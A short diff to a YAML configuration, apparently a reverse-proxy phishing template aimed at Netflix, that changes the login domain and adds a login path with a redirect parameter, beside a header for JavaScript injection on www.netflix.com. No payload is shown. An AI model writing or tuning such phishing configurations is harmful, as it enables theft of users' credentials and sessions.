@@ -36,8 +36,8 @@ force_post:
     type: 'post'
 
 login:
-  domain: 'netflix.com'
-  path: '/login'
+  domain: 'www.netflix.com'
+  path: '/login?nextpage=https%3A%2F%2Fwww.netflix.com%2Femail'
 
 js_inject:
   - trigger_domains: ["www.netflix.com"]
